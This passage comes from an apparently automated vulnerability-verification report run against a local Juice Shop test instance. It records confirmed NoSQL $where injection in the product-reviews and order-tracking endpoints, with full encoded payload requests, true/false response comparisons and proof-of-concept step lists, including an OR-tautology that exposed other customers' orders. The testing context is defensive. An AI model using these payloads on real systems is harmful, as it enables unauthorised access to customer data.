+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 17
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 395
+
+        etag: W/"18b-T8og0pbeju2nMwx21O97Qze8qUY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:44:20 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"message":"One of my favorites!","author":"[redacted]","product":1,"likesCount":0,"likedBy":[],"_id":"YuFZFdmp4zrvZrFTf","liked":true},{"message":"Great!
+        We''ll have an apple party. Everyone brings an apple and - STUFFS IT DOWN
+        EACH OTHER''S THROAT!","author":"basil@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"NSpDBdbPr3kMnDRw8","liked":true}]}'
+      role: attack
+      role_label: true condition
+      request_excerpt: 'GET /rest/products/1%20%26%26%20%28877315%3D%3D%3D877315%29/reviews
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"message":"One of my favorites!","author":"[redacted]","product":1,"likesCount":0,"likedBy":[],"_id":"YuFZFdmp4zrvZrFTf","liked":true},{"message":"Great!
+        We''ll have an apple party. Everyone brings an apple and - STUFFS IT DOWN
+        EACH OTHER''S THROAT!","author":"basil@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"NSpDBdbPr3kMnDRw8","liked":true}]}'
+      facts:
+      - 'Compared with the false condition in step 11: same status 200; /data has
+        0 entries there and 2 entries here, 2 of them not in the false condition''s
+        answer.'
+    - step: 11
+      request: 'GET /rest/products/1%20%26%26%20%28877315%3D%3D%3D884198%29/reviews
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 16
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:44:20 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: attack
+      role_label: false condition
+      request_excerpt: 'GET /rest/products/1%20%26%26%20%28877315%3D%3D%3D884198%29/reviews
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'Compared with the normal request in step 4: same status 200; /data has 2
+        entries there and 0 entries here.'
+    - step: 12
+      request: 'GET /rest/products/1%20%26%26%20%28884198%21%3D%3D877315%29/reviews
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 12
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 395
+
+        etag: W/"18b-T8og0pbeju2nMwx21O97Qze8qUY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:44:20 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"message":"One of my favorites!","author":"[redacted]","product":1,"likesCount":0,"likedBy":[],"_id":"YuFZFdmp4zrvZrFTf","liked":true},{"message":"Great!
+        We''ll have an apple party. Everyone brings an apple and - STUFFS IT DOWN
+        EACH OTHER''S THROAT!","author":"basil@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"NSpDBdbPr3kMnDRw8","liked":true}]}'
+      role: attack
+      role_label: true condition, second form
+      request_excerpt: 'GET /rest/products/1%20%26%26%20%28884198%21%3D%3D877315%29/reviews
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"message":"One of my favorites!","author":"[redacted]","product":1,"likesCount":0,"likedBy":[],"_id":"YuFZFdmp4zrvZrFTf","liked":true},{"message":"Great!
+        We''ll have an apple party. Everyone brings an apple and - STUFFS IT DOWN
+        EACH OTHER''S THROAT!","author":"basil@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"NSpDBdbPr3kMnDRw8","liked":true}]}'
+      facts:
+      - 'Compared with the false condition, second form in step 13: same status 200;
+        /data has 0 entries there and 2 entries here, 2 of them not in the false condition,
+        second form''s answer.'
+    - step: 13
+      request: 'GET /rest/products/1%20%26%26%20%28884198%21%3D%3D884198%29/reviews
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 13
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:44:20 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: attack
+      role_label: false condition, second form
+      request_excerpt: 'GET /rest/products/1%20%26%26%20%28884198%21%3D%3D884198%29/reviews
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'Compared with the normal request in step 4: same status 200; /data has 2
+        entries there and 0 entries here.'
+  planning:
+  - step: 3
+    path: /rest/products/:id/reviews
+    hypothesis: The :id path param is concatenated unquoted into a MongoDB $where
+      clause 'this.product == ' + id, allowing boolean predicate injection that changes
+      which reviews are returned.
+  evidence_review:
+    status: clear
+    rounds: 0
+    reviews: 1
+    visual_review: not-performed
+    images_reviewed: []
+    reason: Evidence text and layout checks passed; no screenshot shown to the model
+      (no application screenshot to show).
+    issues: []
+    presentations: []
+    variants:
+    - T-033-c23d5ea977c2e5ab
+  technical_review:
+    status: not-reviewed
+    rounds: 0
+    reviews: 0
+    inspected_steps: []
+    reason: A confirmed verdict whose proof check passed is not reviewed (VER-046).
+    issues: []
+  selection_reason: null
+  target_location:
+    source_file: routes/showProductReviews.ts
+    source_line: null
+  timing:
+    started: '2026-11-12T12:43:41.079559Z'
+    finished: '2026-11-12T12:44:35.840401Z'
+- result_id: VF-021
+  finding_ref:
+    id: T-033
+    match_key: routes/showproductreviews.ts|CWE-943
+    instance: routes/showProductReviews.ts:36
+    title: NoSQL injection in product reviews $where — routes/showProductReviews.ts:36
+    cwe: CWE-943
+    variant: variant-002
+    variant_digest: fd6533ce571d4d885625aa0ca6c9699f391d131bf1e0deb1516b2b3cdb4e6ca1
+  class: injection
+  eligibility:
+    status: dynamic
+    reason: 'proof: behavioural-difference'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every declared variant needs a state change'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/showProductReviews.ts
+    source_line: null
+- result_id: VF-022
+  finding_ref:
+    id: T-034
+    match_key: routes/trackorder.ts|CWE-943
+    instance: routes/trackOrder.ts:18
+    title: NoSQL injection in order tracking $where predicate — routes/trackOrder.ts:18
+    cwe: CWE-943
+    variant: variant-001
+    variant_digest: b2749fff0d93b959e9eac8d04fbe0ce6c0387721a14a9ca182dea95bebaba032
+  class: injection
+  eligibility:
+    status: dynamic
+    reason: 'proof: behavioural-difference'
+  verdict: confirmed
+  confidence: medium
+  rationale: 'The id parameter in GET /rest/track-order/:id is spliced unescaped into
+    the server-side $where JS predicate this.orderId === ''${id}''. Using a known
+    valid orderId, appending a closing quote plus an injected boolean sub-expression
+    and re-closing the string (e.g. ''5267-173e24c7ffc77007'' && (655396===655396)
+    && ''x''==''x'') caused the predicate to still evaluate true and return the full
+    real order document (including the masked email field), while the complementary
+    false sub-expression (655396===661429) suppressed the match and returned only
+    the synthetic fallback object lacking the email field. This true/false split was
+    reproduced twice with both the === and !== predicate forms, confirming genuine
+    control over the server-side JavaScript boolean expression rather than mere reflection.
+    This demonstrates the injection primitive described in the finding: attacker-controlled
+    boolean logic inside the $where predicate, which (as shown earlier in steps 6/9
+    with an OR-based tautology) also lets an attacker broaden matching to other customers''
+    orders.'
+  proof:
+    checked: true
+    contract: 3
+    steps:
+    - 26
+    - 27
+    - 28
+    - 29
+    - 30
+    - 31
+    - 32
+    - 33
+    - 34
+    - 35
+    kind: boolean
+    form: predicate
+    tested_path: /rest/track-order/:id
+    variant: variant-001
+    hypothesis: id is spliced unescaped into the server-side JS $where predicate this.orderId
+      === '${id}'; appending a closing quote plus && {{predicate}} && 'x'=='x after
+      a known valid orderId lets the injected predicate decide whether that real order
+      document (with its email field) is returned, versus the synthetic fallback object
+      lacking an email field.
+    observation_pointer: /data/0/email
+    scope: cited requests only
+  identities_used:
+  - anonymous
+  state_changes: []
+  deviation: null
+  observations:
+  - An earlier OR-tautology control (steps 6 and 9) returned multiple unrelated customers'
+    orders with masked emails and totals, corroborating the cross-customer data exposure
+    described in the finding.
+  - 'Application screenshot unavailable: no application page showing the confirmed
+    effect was captured; for API-only findings the recorded HTTP exchanges are the
+    primary evidence.'
+  limits_hit: null
+  evidence:
+  - kind: exchange
+    path: evidence/T-034-b2749fff0d93b959-exchanges.json
+    redacted: true
+    sha256: 4866233f6b8861ad54280a1c14c9a82c56d8b370cc399d835864e577c70988f1
+  - kind: har
+    path: evidence/T-034-b2749fff0d93b959-poc.har
+    redacted: true
+    sha256: a7b335369df54958effc1bc864c131997b2ab445f5fc9dd86b84dbf86a67bbb9
+    note: may show target data; review before sharing
+  - kind: screenshot
+    path: evidence/T-034-b2749fff0d93b959-nosql-injection-in-order-tracking-where-predicate-http-1.png
+    sha256: c633e22ca01a174bedb39630299b1c9b0d12c1171554f19cfd043ba522cdc41e
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 0
+  - kind: screenshot
+    path: evidence/T-034-b2749fff0d93b959-nosql-injection-in-order-tracking-where-predicate-http-2.png
+    sha256: ff0d8b5a55352043b4e499e919e4fef5f374850c11055cb0f816f32ff326c107
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 0
+  - kind: screenshot
+    path: evidence/T-034-b2749fff0d93b959-nosql-injection-in-order-tracking-where-predicate-http-3.png
+    sha256: c0c6dca4984ad35b11ae0eb720a82a745017a808d681e0bd54f0733bb9e29a5c
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 0
+  poc:
+    file: evidence/T-034-b2749fff0d93b959-poc.har
+    steps:
+    - step: 5
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/vrf23d9a53d-nomatch
+        as anonymous → 200, 63 bytes
+      decisive: false
+    - step: 6
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/vrf23d9a53d%27%20%7C%7C%20%27x%27%3D%3D%27x
+        as anonymous → 200, 920 bytes
+      decisive: true
+    - step: 7
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/vrf23d9a53d%27%20%26%26%20%27x%27%3D%3D%27y
+        as anonymous → 200, 67 bytes
+      decisive: false
+    - step: 8
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/vrf23d9a53d-nomatch
+        as anonymous → 200, 63 bytes
+      decisive: false
+    - step: 9
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/vrf23d9a53d%27%20%7C%7C%20%27x%27%3D%3D%27x
+        as anonymous → 200, 920 bytes
+      decisive: true
+    - step: 10
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/vrf23d9a53d%27%20%26%26%20%27x%27%3D%3D%27y
+        as anonymous → 200, 67 bytes
+      decisive: false
+    - step: 14
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007
+        as anonymous → 200, 351 bytes
+      decisive: false
+    - step: 15
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28608908%3D%3D%3D608908%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 351 bytes
+      decisive: false
+    - step: 16
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28608908%3D%3D%3D616334%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 98 bytes
+      decisive: false
+    - step: 17
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28616334%21%3D%3D608908%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 351 bytes
+      decisive: false
+    - step: 18
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28616334%21%3D%3D616334%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 98 bytes
+      decisive: false
+    - step: 19
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007
+        as anonymous → 200, 351 bytes
+      decisive: false
+    - step: 20
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28608908%3D%3D%3D608908%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 351 bytes
+      decisive: false
+    - step: 21
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28608908%3D%3D%3D616334%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 98 bytes
+      decisive: false
+    - step: 22
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28616334%21%3D%3D608908%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 351 bytes
+      decisive: false
+    - step: 23
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28616334%21%3D%3D616334%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 98 bytes
+      decisive: false
+    - step: 26
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007
+        as anonymous → 200, 351 bytes
+      decisive: true
+    - step: 27
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28655396%3D%3D%3D655396%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 351 bytes
+      decisive: true
+    - step: 28
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28655396%3D%3D%3D661429%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 98 bytes
+      decisive: true
+    - step: 29
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28661429%21%3D%3D655396%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 351 bytes
+      decisive: true
+    - step: 30
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28661429%21%3D%3D661429%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 98 bytes
+      decisive: true
+    - step: 31
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007
+        as anonymous → 200, 351 bytes
+      decisive: true
+    - step: 32
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28655396%3D%3D%3D655396%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 351 bytes
+      decisive: true
+    - step: 33
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28655396%3D%3D%3D661429%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 98 bytes
+      decisive: true
+    - step: 34
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28661429%21%3D%3D655396%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 351 bytes
+      decisive: true
+    - step: 35
+      line: http_request GET http://127.0.0.1:3000/rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28661429%21%3D%3D661429%29%20%26%26%20%27x%27%3D%3D%27x
+        as anonymous → 200, 98 bytes
+      decisive: true
+    shown:
+    - step: 26
+      request: 'GET /rest/track-order/5267-173e24c7ffc77007 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 13
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 351
+
+        etag: W/"15f-Rd+IOaQareJAbDyTa/Z/QaHTqhs"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:48:05 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"}]}'
+      role: normal
+      role_label: baseline input
+      request_excerpt: 'GET /rest/track-order/5267-173e24c7ffc77007 HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"}]}'
+      facts: []
+    - step: 31
+      request: 'GET /rest/track-order/5267-173e24c7ffc77007 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 18
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 351
+
+        etag: W/"15f-Rd+IOaQareJAbDyTa/Z/QaHTqhs"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:48:06 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"}]}'
+      role: normal
+      role_label: baseline input
+      request_excerpt: 'GET /rest/track-order/5267-173e24c7ffc77007 HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"}]}'
+      facts: []
+    - step: 27
+      request: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28655396%3D%3D%3D655396%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 17
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 351
+
+        etag: W/"15f-Rd+IOaQareJAbDyTa/Z/QaHTqhs"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:48:05 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"}]}'
+      role: attack
+      role_label: true condition
+      request_excerpt: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28655396%3D%3D%3D655396%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"}]}'
+      facts:
+      - 'Compared with the false condition in step 28: same status 200; 17 of 18 JSON
+        values differ, e.g. /data/0/orderId: "5267-173e24c7ffc77007'' && (655396===661429)
+        && ''x''==''x" → "5267-173e24c7ffc77007"; /data/0/email: absent → "*dm*n@j**c*-sh.*p".'
+    - step: 28
+      request: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28655396%3D%3D%3D661429%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 11
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 98
+
+        etag: W/"62-eYw6urCaQwkmXY70LBH08DDs/5w"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:48:05 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007'' && (655396===661429)
+        && ''x''==''x"}]}'
+      role: attack
+      role_label: false condition
+      request_excerpt: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28655396%3D%3D%3D661429%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007'' && (655396===661429)
+        && ''x''==''x"}]}'
+      facts:
+      - 'Compared with the normal request in step 26: same status 200; 17 of 18 JSON
+        values differ, e.g. /data/0/orderId: "5267-173e24c7ffc77007" → "5267-173e24c7ffc77007''
+        && (655396===661429) && ''x''==''x"; /data/0/email: "*dm*n@j**c*-sh.*p" →
+        absent.'
+    - step: 29
+      request: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28661429%21%3D%3D655396%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 12
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 351
+
+        etag: W/"15f-Rd+IOaQareJAbDyTa/Z/QaHTqhs"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:48:05 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"}]}'
+      role: attack
+      role_label: true condition, second form
+      request_excerpt: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28661429%21%3D%3D655396%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"}]}'
+      facts:
+      - 'Compared with the false condition, second form in step 30: same status 200;
+        17 of 18 JSON values differ, e.g. /data/0/orderId: "5267-173e24c7ffc77007''
+        && (661429!==661429) && ''x''==''x" → "5267-173e24c7ffc77007"; /data/0/email:
+        absent → "*dm*n@j**c*-sh.*p".'
+    - step: 30
+      request: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28661429%21%3D%3D661429%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 18
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 98
+
+        etag: W/"62-6AQS7ArgDP1xs10Uws6Qr2Qg4kw"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:48:05 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007'' && (661429!==661429)
+        && ''x''==''x"}]}'
+      role: attack
+      role_label: false condition, second form
+      request_excerpt: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28661429%21%3D%3D661429%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007'' && (661429!==661429)
+        && ''x''==''x"}]}'
+      facts:
+      - 'Compared with the normal request in step 26: same status 200; 17 of 18 JSON
+        values differ, e.g. /data/0/orderId: "5267-173e24c7ffc77007" → "5267-173e24c7ffc77007''
+        && (661429!==661429) && ''x''==''x"; /data/0/email: "*dm*n@j**c*-sh.*p" →
+        absent.'
+    - step: 32
+      request: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28655396%3D%3D%3D655396%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
